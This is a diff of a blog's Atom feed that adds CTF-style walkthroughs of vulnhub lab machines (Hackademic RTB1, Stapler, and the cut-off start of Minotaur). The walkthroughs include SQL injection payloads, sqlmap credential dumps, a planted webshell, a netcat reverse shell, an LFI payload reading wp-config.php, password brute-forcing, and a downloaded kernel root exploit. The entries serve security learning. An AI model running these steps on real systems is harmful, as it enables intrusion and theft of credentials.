@@ -4,7 +4,7 @@
   <title><![CDATA[Category: wordpress | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/wordpress/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-09T13:26:19-05:00</updated>
+  <updated>2017-01-25T13:58:13-06:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,645 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[hackademic:rtb1]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/03/hackademic-rtb1/"/>
+    <updated>2016-08-03T10:30:58-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/03/hackademic-rtb1</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>Netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Wpscan</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/15285/">Linux Kernel 2.6.36-rc8 - RDS Protocol Local Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/rtb1/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.157 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.157 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only port 80 is opening.</p>
+
+<p>Use both wfuzz and nikto to scan the host, nothing interesting&hellip;</p>
+
+<p>Check the page,</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a link <code>http://192.168.41.157/Hackademic_RTB1/</code></p>
+
+<p>use wfuzz to scan:</p>
+
+<pre><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.157/Hackademic_RTB1/FUZZ 2&gt;/dev/null
+</code></pre>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>There is a wordpress.</p>
+
+<p>use wpscan to scan</p>
+
+<p><code>wpscan http://192.168.41.157/Hackademic_RTB1/</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>There are a couple of exploits, I tried both of them and no luck.</p>
+
+<p>Enumerate the page, find a possible SQL injection potint:</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0'</code></p>
+
+<p>looks like parameter cat is vulnerable</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next try:</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 1</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>keep trying until</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 order by 6</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got error. Now I know the current table in user by the vulnerable page has 5 columns.</p>
+
+<p>next</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0 union all select 1,2,3,4,5</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I can use second column to do injection.</p>
+
+<p><code>http://192.168.41.157/Hackademic_RTB1/?cat=0%20union%20all%20select%201,@@version,3,4,5</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next use sqlmap to get all tables,</p>
+
+<p><code>sqlmap -u "http://192.168.41.157/Hackademic_RTB1/?cat=0" --dbms mysql --tables --level=5 --risk=3</code></p>
+
+<p>get table names:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I want to check table <code>wp_users</code></p>
+
+<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users  --columns</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>dump these two columns</p>
+
+<p><code>sqlmap -u 'http://192.168.41.157/Hackademic_RTB1/?cat=0' -D wordpress -T wp_users -C user_nickname,user_pass --dump</code></p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now we can edit php webshell via plugin</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Only textile1.php can be updated. Use that file to edit shell.</p>
+
+<p>Setup netcat, and load <code>http://192.168.41.157/Hackademic_RTB1/wp-content/plugins/textile1.php</code></p>
+
+<p>get shell</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><code>uname -a</code></p>
+
+<p>get the <code>Linux HackademicRTB1 2.6.31.5-127.fc12.i686 #1 SMP Sat Nov 7 21:41:45 EST 2009 i686 i686 i386 GNU/Linux</code></p>
+
+<p>I tried serveral local exploits and find this one works:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_022.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/rtb1/Selection_023.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[stapler]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/25/stapler/"/>
+    <updated>2016-07-25T10:57:44-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/25/stapler</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/39646/">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a>
+<a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.152 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.152 -p-</code></p>
+
+<pre><code>Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-25 11:01 CDT
+NSE: Loaded 138 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 11:01
+Completed NSE at 11:01, 0.00s elapsed
+Initiating NSE at 11:01
+Completed NSE at 11:01, 0.00s elapsed
+Initiating ARP Ping Scan at 11:01
+Scanning 192.168.41.152 [1 port]
+Completed ARP Ping Scan at 11:01, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:01
+Completed Parallel DNS resolution of 1 host. at 11:01, 13.00s elapsed
+Initiating SYN Stealth Scan at 11:01
+Scanning 192.168.41.152 [65535 ports]
+Discovered open port 3306/tcp on 192.168.41.152
+Discovered open port 80/tcp on 192.168.41.152
+Discovered open port 21/tcp on 192.168.41.152
+Discovered open port 22/tcp on 192.168.41.152
+Discovered open port 139/tcp on 192.168.41.152
+Discovered open port 53/tcp on 192.168.41.152
+Discovered open port 12380/tcp on 192.168.41.152
+SYN Stealth Scan Timing: About 47.37% done; ETC: 11:02 (0:00:34 remaining)
+Discovered open port 666/tcp on 192.168.41.152
+Completed SYN Stealth Scan at 11:02, 53.87s elapsed (65535 total ports)
+Initiating Service scan at 11:02
+Scanning 8 services on 192.168.41.152
+Completed Service scan at 11:02, 18.57s elapsed (8 services on 1 host)
+Initiating OS detection (try #1) against 192.168.41.152
+NSE: Script scanning 192.168.41.152.
+Initiating NSE at 11:02
+NSE: [ftp-bounce] Couldn't resolve scanme.nmap.org, scanning 10.0.0.1 instead.
+Completed NSE at 11:04, 127.93s elapsed
+Initiating NSE at 11:04
+Completed NSE at 11:04, 1.06s elapsed
+Nmap scan report for 192.168.41.152
+Host is up (0.00066s latency).
+Not shown: 65523 filtered ports
+PORT      STATE  SERVICE     VERSION
+20/tcp    closed ftp-data
+21/tcp    open   ftp         vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: Can't parse PASV response: "Permission denied."
+22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|_  256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+53/tcp    open   domain      dnsmasq 2.75
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.75
+80/tcp    open   http
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: 404 Not Found
+123/tcp   closed ntp
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   open   netbios-ssn Samba smbd 3.X (workgroup: RED)
+666/tcp   open   doom?
+3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+|_mysql-info: ERROR: Script execution failed (use -d to debug)
+12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Tim, we need to-do better next year for Initech
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.12%I=7%D=7/25%Time=5796380B%P=i586-pc-linux-gnu%r(GetReq
+SF:uest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nC
+SF:ontent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533\r
+SF:\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;&lt;
+SF:style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#333333
+SF:;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5em;
+SF:\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-hei
+SF:ght:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20black
+SF:;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}\n
+SF:code\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monospac
+SF:e;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20Found&lt;/h1&gt;&lt;
+SF:p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/&lt;/code&gt;\x20wa
+SF:s\x20not\x20found\x20on\x20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;")%r(HTTPO
+SF:ptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20close\r\
+SF:nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x20533
+SF:\r\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Found&lt;/title
+SF:&gt;&lt;style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20#3333
+SF:33;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x201\.5e
+SF:m;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20min-h
+SF:eight:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x20bla
+SF:ck;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;\x20}
+SF:\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:monosp
+SF:ace;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20Found&lt;/h1
+SF:&gt;&lt;p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/&lt;/code&gt;\x20
+SF:was\x20not\x20found\x20on\x20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;")%r(Fou
+SF:rOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20
+SF:close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length
+SF::\x20568\r\n\r\n&lt;!doctype\x20html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;404\x20Not\x20Foun
+SF:d&lt;/title&gt;&lt;style&gt;\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\
+SF:x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\
+SF:x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\
+SF:x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inse
+SF:t\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010
+SF:px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-famil
+SF:y:monospace;\x20padding:0\x202px;}\n&lt;/style&gt;\n&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Not\x20F
+SF:ound&lt;/h1&gt;&lt;p&gt;The\x20requested\x20resource\x20&lt;code\x20class=\"url\"&gt;/nic
+SF:e%20ports%2C/Tri%6Eity\.txt%2ebak&lt;/code&gt;\x20was\x20not\x20found\x20on\x
+SF:20this\x20server\.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port666-TCP:V=7.12%I=7%D=7/25%Time=57963805%P=i586-pc-linux-gnu%r(NULL,
+SF:2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x152
+SF:\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04\
+SF:xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2\
+SF:x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\x0
+SF:c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb2
+SF:\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\x
+SF:eeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3\
+SF:x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0\
+SF:xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x87
+SF:\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf4
+SF:\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xdc
+SF:\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5\
+SF:x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf\
+SF:xbd&amp;&amp;q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\x
+SF:c3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x8
+SF:a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\xe
+SF:7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\x
+SF:f6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x9
+SF:a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\xf
+SF:1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\xf
+SF:8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\x
+SF:d7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\xd
+SF:2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\x
+SF:f9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[\
+SF:x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xcc
+SF:\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7\
+SF:xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\xf
+SF:d\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96\
+SF:x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f\x
+SF:d0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4\x
+SF:ed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x8
+SF:8\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbcL
+SF:}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\.
+SF:npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\xf
+SF:6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf3
+SF:\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?\
+SF:xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
+MAC Address: 00:0C:29:11:36:D7 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Uptime guess: 0.005 days (since Mon Jul 25 10:57:52 2016)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| nbstat: NetBIOS name: RED, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   RED&lt;00&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   RED&lt;03&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   RED&lt;20&gt;              Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
+|   Computer name: red
+|   NetBIOS computer name: RED
+|   Domain name: 
+|   FQDN: red
+|_  System time: 2016-07-25T17:02:34+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smbv2-enabled: Server supports SMBv2 protocol
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.66 ms 192.168.41.152
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:04
+Completed NSE at 11:04, 0.00s elapsed
+Initiating NSE at 11:04
+Completed NSE at 11:04, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 217.50 seconds
+           Raw packets sent: 131125 (5.771MB) | Rcvd: 64 (3.108KB)
+</code></pre>
+
+<p>Well, lots of ports are opening. Scan ftp first.</p>
+
+<pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_version
+msf auxiliary(ftp_version) &gt; set rhosts 192.168.41.152  
+msf auxiliary(ftp_version) &gt; run
+</code></pre>
+
+<p>got this:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like got a username <code>Harry</code></p>
+
+<p>port 80 looks nothing.</p>
+
+<p>try port 12380.</p>
+
+<p>use nikto to scan:</p>
+
+<p><code>nikto -h 192.168.41.152:12380</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like we have <code>/blogblog/</code> and <code>/admin12233/</code>.</p>
+
+<p>since the SSL is being used.</p>
+
+<p><code>https://192.168.41.152:12380/blogblog/</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the resouce:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like a wordpress is there.</p>
+
+<p>use wpscan to enumerate</p>
+
+<p><code>wpscan -u https://192.168.41.152:12380/blogblog/ -enum username</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>since dunring ftp eumeration, I found a username <code>harry</code>, I will use it to crack password</p>
+
+<p><code>wpscan -u https://192.168.41.152:12380/blogblog/ --username harry --wordlist /usr/share/wordlists/rockyou.txt</code></p>
+
+<p>got the password:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login wordpress.</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, harry is not admin. Try another account, <code>john</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now got <code>john</code>&rsquo;s pasword is <code>incorrect</code>, login as <code>john</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>and it is admin.</p>
+
+<p>try to upload webshell and failed, since wordpress requires ftp cred.</p>
+
+<p>Checked other plugin, I found:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit advanced video</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got a LFI exploit.</p>
+
+<p>Try the POC:</p>
+
+<pre><code>https://192.168.41.152:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=../wp-config.php
+</code></pre>
+
+<p>and got:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check folder:</p>
+
+<p><code>https://192.168.41.152:12380/blogblog/wp-content/uploads/</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like the reverse shell is uploaded successfully, even it is not installed as plugin.</p>
+
+<p>setup netcat, get the shell:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get linux kernel version, then do</p>
+
+<p><code>searchsploit 4.4 | grep linux</code></p>
+
+<p>and found exploit <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>
+
+<p>In kali:</p>
+
+<pre><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+cp 39772.zip /var/www/html/
+</code></pre>
+
+<p>In target:</p>
+
+<pre><code>unzip 39772.zip
+cd 39772
+tar xvf exploit.tar
+cd ebpf_mapfd_doubleput_exploit/
+./compile.sh
+./doubleput
+</code></pre>
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[SecTalks: BNE0x00 - Minotaur]]></title>
+    <link href="http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur/"/>
+    <updated>2016-04-26T13:27:14-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/04/26/sectalks-bne0x00-minotaur</id>
+    <content type="html"><![CDATA[<p>From <a href="https://www.vulnhub.com/entry/sectalks-bne0x00-minotaur,139/">Vulhub</a></p>
+
+<h3>Forces:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>WPscan</li>
+<li>msfvenom</li>
+<li>John the Ripper</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.223 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.56.223 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22, 80 and 2020 are opening.</p>
+
+<p>use wfuzz to find more locations</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.223/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>found <a href="http://192.168.56.223/bull/">http://192.168.56.223/bull/</a></p>
+
+<p>Check the page, looks like it uses wordpress. Good. maybe I can find out some outdated wordpress plugins.</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>I use wpscan to find wordpress plugins vulnerabilities.</p>
+
+<p><code>uby wpscan.rb --url http://192.168.56.223/bull/</code></p>
+
+<p>get some xss vulnerabilities and an interestig arbutrart file upload vulnerability.</p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>next step, user enumeration.</p>
+
+<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --enumerate u</code></p>
+
+<p><img src="/images/blog/vulhub/bne03/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get a user name <code>bully</code></p>
+
+<p>next step, password guessing:</p>
+
+<p><code>ruby wpscan.rb --url http://192.168.56.223/bull/ --wordlist SecLists/Passwords/passwords_john.txt threads 50</code></p>
+
+<p>no luck this time. Let&rsquo;s try harder..</p>
+
+<p>we use cewl this time to generate password file</p>
+
+<p><code>cewl -w password.txt http://192.168.56.223/bull/</code></p>
+
+<p>also john the ripper should be used to mutate the password file:</p>
+
